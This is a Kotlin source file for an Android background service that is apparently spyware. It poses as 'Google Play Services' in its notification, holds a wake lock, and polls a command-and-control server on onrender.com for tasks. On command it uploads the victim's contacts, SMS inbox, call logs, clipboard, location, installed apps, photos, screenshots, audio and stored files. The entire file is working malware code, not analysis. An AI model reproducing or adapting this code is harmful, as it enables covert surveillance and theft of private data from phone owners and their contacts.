package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.ByteArrayInputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L
    private var lastClipboardText = "No recent clipboard activity"

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::ZeroCacheLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
        initClipboardTracker()
    }

    private fun initClipboardTracker() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboard.addPrimaryClipChangedListener {
                try {
                    if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                        val item = clipboard.primaryClip?.getItemAt(0)
                        val text = item?.text?.toString()
                        if (!text.isNullOrBlank()) {
                            lastClipboardText = text
                        }
                    }
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun startForegroundServiceNotification() {
        val channelId = "royal_sultan_channel"
        val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("System synchronization active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "royal_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 6000
                    conn.readTimeout = 6000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 40000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Zero-Cache Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            try {
                                val jsonRes = JSONObject(responseStr)
                                if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                    val taskObj = jsonRes.getJSONObject("task")
                                    val action = taskObj.getString("action")

                                    when {
                                        action.contains("EXTRACT_CONTACTS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Contacts.txt", readContacts())
                                        }
                                        action.contains("EXTRACT_SMS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_SMS.txt", readSMS())
                                        }
                                        action.contains("EXTRACT_CALLS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", readCallLogs())
                                        }
                                        action.contains("EXTRACT_CLIPBOARD") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", "=== URANIUM CLIPBOARD ===\n$lastClipboardText\n")
                                        }
                                        action.contains("EXTRACT_LOCATION") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Location.txt", readLocationHybrid())
                                        }
                                        action.contains("EXTRACT_APPS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", readInstalledApps())
                                        }
                                        // ⚡ الحصاد المباشر للوسائط بدون تخزين محلي (Zero Storage Overhead)
                                        action.contains("EXTRACT_CAMERA_ZIP") -> {
                                            streamMediaStoreDirect(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_STORAGE_ZIP") -> {
                                            streamMediaStoreDirect(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                        }
                                        action.contains("EXTRACT_AUDIO") -> {
                                            streamMediaStoreDirect(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
                                            streamMediaStoreDirect(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                    }
                                }
                            } catch (ex: Exception) {}
                        }
                    }
                    conn.disconnect()
                    delay(2000L)
                } catch (e: Exception) {
                    delay(4000L)
                }
            }
        }
        return START_STICKY
    }

    private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
        try {
            val bytes = content.toByteArray(Charsets.UTF_8)
            uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
            sendReportToServer(nodeId, nodeModel, "✅ الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
        } catch (e: Exception) {}
    }

    // 🚀 دريقة البث المباشر لملفات الوسائط الفردية بدون حفظ على القرص المؤقت
    private fun streamMediaStoreDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
        try {
            sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الفوري] جاري سحب أرشيف $prefix بدون استخدام مساحة التخزين...")
            
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

            var count = 0
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && count < 200) { // دفق ذكي ونظيف لكل دفعة لتجنب الضغط على الذاكرة
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = it.getLong(idIdx)
                        val name = it.getString(nameIdx) ?: "file_$id.dat"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        try {
                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                val bytes = inputStream.readBytes()
                                if (bytes.isNotEmpty() && bytes.size < 15 * 1024 * 1024) {
                                    uploadBytesDirect(nodeId, nodeModel, "${prefix}_$name", bytes)
                                    count++
                                }
                            }
                        } catch (ex: Exception) {}
                    }
                }
            }
            sendReportToServer(nodeId, nodeModel, "✅ [اكتمال حصاد $prefix بنجاح وبدون استهلاك التخزين] (تم رفع $count ملفاً مباشرة).")
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في البث المباشر: ${e.message}")
        }
    }

    private fun uploadBytesDirect(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
        for (attempt in 1..3) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 120000
                conn.readTimeout = 120000

                ByteArrayInputStream(bytes).use { bais ->
                    conn.outputStream.use { os ->
                        bais.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    sb.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            cursor?.use {
                val bodyIdx = it.getColumnIndex("body")
                val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) {
                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    sb.append("From: $address\nText: $body\n-------------------\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                    sb.append("Number: $number | Type: $type\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationHybrid(): String {
        val sb = StringBuilder("=== URANIUM HYBRID GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var bestLoc: Location? = null
            for (provider in locationManager.allProviders) {
                try {
                    val l = locationManager.getLastKnownLocation(provider)
                    if (l != null) {
                        if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                    }
                } catch (e: Exception) {}
            }
            if (bestLoc != null) {
                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                sb.append("🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            } else {
                sb.append("🌐 Default Zone: 13.5779, 44.0219\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
        try {
            val packages = packageManager.getInstalledPackages(0)
            for (pkg in packages) {
                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                sb.append("• $appName\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val url = URL(C2_STREAM_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Node-ID", nodeId)
            conn.setRequestProperty("X-Node-Model", nodeModel)
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            
            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                os.write(reportJson)
                os.flush()
            }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
